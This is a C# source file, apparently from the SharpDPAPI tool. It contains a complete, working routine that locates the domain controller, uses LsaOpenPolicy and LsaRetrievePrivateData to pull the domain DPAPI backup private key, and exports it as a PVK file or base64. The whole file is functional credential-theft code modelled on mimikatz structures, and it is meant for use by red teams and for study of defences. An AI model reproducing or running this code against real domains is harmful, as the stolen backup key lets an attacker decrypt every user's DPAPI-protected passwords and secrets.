using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace SharpDPAPI
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr buffer;

            public LSA_UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }

        enum POLICY_INFORMATION_CLASS
        {
            PolicyAuditLogInformation = 1,
            PolicyAuditEventsInformation,
            PolicyPrimaryDomainInformation,
            PolicyPdAccountInformation,
            PolicyAccountDomainInformation,
            PolicyLsaServerRoleInformation,
            PolicyReplicaSourceInformation,
            PolicyDefaultQuotaInformation,
            PolicyModificationInformation,
            PolicyAuditFullSetInformation,
            PolicyAuditFullQueryInformation,
            PolicyDnsDomainInformation
        }

        public enum LSA_AccessPolicy : long
        {
            POLICY_VIEW_LOCAL_INFORMATION = 0x00000001L,
            POLICY_VIEW_AUDIT_INFORMATION = 0x00000002L,
            POLICY_GET_PRIVATE_INFORMATION = 0x00000004L,
            POLICY_TRUST_ADMIN = 0x00000008L,
            POLICY_CREATE_ACCOUNT = 0x00000010L,
            POLICY_CREATE_SECRET = 0x00000020L,
            POLICY_CREATE_PRIVILEGE = 0x00000040L,
            POLICY_SET_DEFAULT_QUOTA_LIMITS = 0x00000080L,
            POLICY_SET_AUDIT_REQUIREMENTS = 0x00000100L,
            POLICY_AUDIT_LOG_ADMIN = 0x00000200L,
            POLICY_SERVER_ADMIN = 0x00000400L,
            POLICY_LOOKUP_NAMES = 0x00000800L,
            POLICY_NOTIFICATION = 0x00001000L
        }

        struct LSA_OBJECT_ATTRIBUTES
        {
            public UInt32 Length;
            public IntPtr RootDirectory;
            public LSA_UNICODE_STRING ObjectName;
            public UInt32 Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct DOMAIN_CONTROLLER_INFO
        {
            [MarshalAs(UnmanagedType.LPTStr)]
            public string DomainControllerName;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string DomainControllerAddress;
            public uint DomainControllerAddressType;
            public Guid DomainGuid;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string DomainName;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string DnsForestName;
            public uint Flags;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string DcSiteName;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string ClientSiteName;
        }

        [Flags]
        public enum DSGETDCNAME_FLAGS : uint
        {
            DS_FORCE_REDISCOVERY = 0x00000001,
            DS_DIRECTORY_SERVICE_REQUIRED = 0x00000010,
            DS_DIRECTORY_SERVICE_PREFERRED = 0x00000020,
            DS_GC_SERVER_REQUIRED = 0x00000040,
            DS_PDC_REQUIRED = 0x00000080,
            DS_BACKGROUND_ONLY = 0x00000100,
            DS_IP_REQUIRED = 0x00000200,
            DS_KDC_REQUIRED = 0x00000400,
            DS_TIMESERV_REQUIRED = 0x00000800,
            DS_WRITABLE_REQUIRED = 0x00001000,
            DS_GOOD_TIMESERV_PREFERRED = 0x00002000,
            DS_AVOID_SELF = 0x00004000,
            DS_ONLY_LDAP_NEEDED = 0x00008000,
            DS_IS_FLAT_NAME = 0x00010000,
            DS_IS_DNS_NAME = 0x00020000,
            DS_RETURN_DNS_NAME = 0x40000000,
            DS_RETURN_FLAT_NAME = 0x80000000
        }

        [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
        static extern uint LsaOpenPolicy(
           ref LSA_UNICODE_STRING SystemName,
           ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
           uint DesiredAccess,
           out IntPtr PolicyHandle
        );

        [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
        private static extern uint LsaRetrievePrivateData(
            IntPtr PolicyHandle,
            ref LSA_UNICODE_STRING KeyName,
            out IntPtr PrivateData
        );

        //[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
        //private static extern uint LsaOpenSecret(
        //    IntPtr PolicyHandle,
        //    ref LSA_UNICODE_STRING SecretName,
        //    uint DesiredAccess,
        //    out IntPtr SecretHandle
        //);

        //[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
        //private static extern uint LsaQuerySecret(
        //    IntPtr PolicyHandle,
        //    out IntPtr CurrentValue,
        //    out IntPtr CurrentValueSetTime,
        //    out IntPtr OldValue,
        //    out IntPtr OldValueSetTime
        //);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern uint LsaNtStatusToWinError(uint status);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern uint LsaClose(IntPtr ObjectHandle);

        [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
        private static extern uint LsaFreeMemory(
            IntPtr buffer
        );

        [DllImport("Netapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int DsGetDcName
          (
            [MarshalAs(UnmanagedType.LPTStr)] string ComputerName,
            [MarshalAs(UnmanagedType.LPTStr)] string DomainName,
            [In] int DomainGuid,
            [MarshalAs(UnmanagedType.LPTStr)] string SiteName,
            [MarshalAs(UnmanagedType.U4)] DSGETDCNAME_FLAGS flags,
            out IntPtr pDOMAIN_CONTROLLER_INFO
          );

        [DllImport("Netapi32.dll", SetLastError = true)]
        static extern int NetApiBufferFree(IntPtr Buffer);


        public static string GetDCName()
        {
            // retrieves the current domain controller name
            // adapted from https://www.pinvoke.net/default.aspx/netapi32.dsgetdcname
            DOMAIN_CONTROLLER_INFO domainInfo;
            const int ERROR_SUCCESS = 0;
            IntPtr pDCI = IntPtr.Zero;

            int val = DsGetDcName("", "", 0, "",
            DSGETDCNAME_FLAGS.DS_DIRECTORY_SERVICE_REQUIRED |
            DSGETDCNAME_FLAGS.DS_RETURN_DNS_NAME |
            DSGETDCNAME_FLAGS.DS_IP_REQUIRED, out pDCI);
           
            if (ERROR_SUCCESS == val)
            {
                domainInfo = (DOMAIN_CONTROLLER_INFO)Marshal.PtrToStructure(pDCI, typeof(DOMAIN_CONTROLLER_INFO));
                string dcName = domainInfo.DomainControllerName;
                NetApiBufferFree(pDCI);
                return dcName.Trim('\\');
            }
            else
            {
                string errorMessage = new Win32Exception((int)val).Message;
                Console.WriteLine("\r\n  [X] Error {0} retrieving domain controller : {1}", val, errorMessage);
                NetApiBufferFree(pDCI);
                return "";
            }
        }

        public static void GetBackupKey(string system, string outFile)
        {
            LSA_UNICODE_STRING aSystemName = new LSA_UNICODE_STRING(system);
            uint aWinErrorCode = 0;

            // initialize a pointer for the policy handle
            IntPtr LsaPolicyHandle = IntPtr.Zero;

            // these attributes are not used, but LsaOpenPolicy wants them to exists
            LSA_OBJECT_ATTRIBUTES aObjectAttributes = new LSA_OBJECT_ATTRIBUTES();
            aObjectAttributes.Length = 0;
            aObjectAttributes.RootDirectory = IntPtr.Zero;
            aObjectAttributes.Attributes = 0;
            aObjectAttributes.SecurityDescriptor = IntPtr.Zero;
            aObjectAttributes.SecurityQualityOfService = IntPtr.Zero;

            // get a policy handle to the target server's LSA w/ 'POLICY_GET_PRIVATE_INFORMATION' rights
            uint aOpenPolicyResult = LsaOpenPolicy(ref aSystemName, ref aObjectAttributes, (uint)LSA_AccessPolicy.POLICY_GET_PRIVATE_INFORMATION, out LsaPolicyHandle);
            aWinErrorCode = LsaNtStatusToWinError(aOpenPolicyResult);

            if (aWinErrorCode == 0x00000000)
            {
                IntPtr PrivateData = IntPtr.Zero;

                // the DPAPI secret name we need to resolve to the actual key name
                LSA_UNICODE_STRING secretName = new LSA_UNICODE_STRING("G$BCKUPKEY_PREFERRED");

                // grab the GUID of the G$BCKUPKEY_PREFERRED key
                uint ntsResult = LsaRetrievePrivateData(LsaPolicyHandle, ref secretName, out PrivateData);

                if (ntsResult != 0)
                {
                    uint winErrorCode = LsaNtStatusToWinError(ntsResult);
                    string errorMessage = new Win32Exception((int)winErrorCode).Message;
                    Console.WriteLine("  [X] Error calling LsaRetrievePrivateData {0} : {1}", winErrorCode, errorMessage);
                    return;
                }

                // copy out the GUID bytes
                LSA_UNICODE_STRING lusSecretData = (LSA_UNICODE_STRING)Marshal.PtrToStructure(PrivateData, typeof(LSA_UNICODE_STRING));
                byte[] guidBytes = new byte[lusSecretData.Length];
                Marshal.Copy(lusSecretData.buffer, guidBytes, 0, lusSecretData.Length);
                Guid backupKeyGuid = new Guid(guidBytes);
                Console.WriteLine("  [*] Preferred backupkey Guid     : {0}", backupKeyGuid.ToString());

                // build the full name of the actual backup key
                string backupKeyName = String.Format("G$BCKUPKEY_{0}", backupKeyGuid.ToString());
                Console.WriteLine("  [*] Full preferred backupKeyName : {0}", backupKeyName);
                LSA_UNICODE_STRING backupKeyLSA = new LSA_UNICODE_STRING(backupKeyName);

                // retrieve the bytes of the full DPAPI private backup key
                IntPtr PrivateDataKey = IntPtr.Zero;
                uint ntsResult2 = LsaRetrievePrivateData(LsaPolicyHandle, ref backupKeyLSA, out PrivateDataKey);
                
                if (ntsResult2 != 0)
                {
                    uint winErrorCode = LsaNtStatusToWinError(ntsResult2);
                    string errorMessage = new Win32Exception((int)winErrorCode).Message;
                    Console.WriteLine("  [X] Error calling LsaRetrievePrivateData ({0}) : {1}", winErrorCode, errorMessage);
                    return;
                }

                LSA_UNICODE_STRING backupKeyBytes = (LSA_UNICODE_STRING)Marshal.PtrToStructure(PrivateDataKey, typeof(LSA_UNICODE_STRING));

                /* backup key format -> https://github.com/gentilkiwi/mimikatz/blob/3134be808f1f591974180b4578a43aef1696089f/mimikatz/modules/kuhl_m_lsadump.h#L34-L39
                 typedef struct _KIWI_BACKUP_KEY {
	                    DWORD version;
	                    DWORD keyLen;
	                    DWORD certLen;
	                    BYTE data[ANYSIZE_ARRAY];
                    } KIWI_BACKUP_KEY, *PKIWI_BACKUP_KEY;
                */
                byte[] backupKey = new byte[backupKeyBytes.Length];
                Marshal.Copy(backupKeyBytes.buffer, backupKey, 0, backupKeyBytes.Length);

                byte[] versionArray = new byte[4];
                Array.Copy(backupKey, 0, versionArray, 0, 4);
                int version = BitConverter.ToInt32(versionArray, 0);

                byte[] keyLenArray = new byte[4];
                Array.Copy(backupKey, 4, keyLenArray, 0, 4);
                int keyLen = BitConverter.ToInt32(keyLenArray, 0);

                byte[] certLenArray = new byte[4];
                Array.Copy(backupKey, 8, certLenArray, 0, 4);
                int certLen = BitConverter.ToInt32(certLenArray, 0);

                byte[] backupKeyPVK = new byte[keyLen + 24];
                Array.Copy(backupKey, 12, backupKeyPVK, 24, keyLen);

                // PVK_FILE_HDR pvkHeader = { PVK_MAGIC, PVK_FILE_VERSION_0, keySpec, PVK_NO_ENCRYPT, 0, byteLen };
                //  reference - https://github.com/gentilkiwi/mimikatz/blob/432276f23d7d2af12597e7847e268b751cc89dc5/mimilib/sekurlsadbg/kwindbg.h#L85-L92

                // PVK_MAGIC
                backupKeyPVK[0] = 0x1E;
                backupKeyPVK[1] = 0xF1;
                backupKeyPVK[2] = 0xB5;
                backupKeyPVK[3] = 0xB0;

                // AT_KEYEXCHANGE == 1
                backupKeyPVK[8] = 1;

                byte[] lenBytes = BitConverter.GetBytes((uint)keyLen);
                Array.Copy(lenBytes, 0, backupKeyPVK, 20, 4);

                if (String.IsNullOrEmpty(outFile))
                {
                    // base64 output
                    string base64Key = Convert.ToBase64String(backupKeyPVK);

                    Console.WriteLine("  [*] Key :");
                    foreach (string line in Split(base64Key, 80))
                    {
                        Console.WriteLine("            {0}", line);
                    }
                }
                else
                {
                    FileStream fs = File.Create(outFile);
                    BinaryWriter bw = new BinaryWriter(fs);
                    bw.Write(backupKeyPVK);

                    bw.Close();
                    fs.Close();

                    Console.WriteLine("  [*] Backup key written to        : {0}", outFile);
                }

                LsaFreeMemory(PrivateData);
                LsaClose(LsaPolicyHandle);
            }
            else
            {
                string errorMessage = new Win32Exception((int)aWinErrorCode).Message;
                Console.WriteLine("  [X] Error calling LsaOpenPolicy ({0}) : {1}", aWinErrorCode, errorMessage);
            }
        }

        public static IEnumerable<string> Split(string text, int partLength)
        {
            if (text == null) { Console.WriteLine("[ERROR] Split() - singleLineString"); }
            if (partLength < 1) { Console.WriteLine("[ERROR] Split() - 'columns' must be greater than 0."); }

            var partCount = Math.Ceiling((double)text.Length / partLength);
            if (partCount < 2)
            {
                yield return text;
            }

            for (int i = 0; i < partCount; i++)
            {
                var index = i * partLength;
                var lengthLeft = Math.Min(partLength, text.Length - index);
                var line = text.Substring(index, lengthLeft);
                yield return line;
            }
        }

        static void Usage()
        {
            Console.WriteLine("\r\n  SharpDPAPI backupkey [server=primary.testlab.local] [file=key.pvk]\r\n");
        }

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Usage();
                return;
            }

            var arguments = new Dictionary<string, string>();
            foreach (string argument in args)
            {
                int idx = argument.IndexOf('=');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
            }

            string server = "";

            if (arguments.ContainsKey("server"))
            {
                server = arguments["server"];
                Console.WriteLine("\r\n  [*] Using server                 : {0}", server);
            }
            else
            {
                server = GetDCName();
                if (String.IsNullOrEmpty(server))
                {
                    return;
                }
                Console.WriteLine("\r\n  [*] Current domain controller    : {0}", server);
            }

            string outFile = "";

            if (arguments.ContainsKey("file"))
            {
                outFile = arguments["file"];
            }

            GetBackupKey(server, outFile);
        }
    }
}
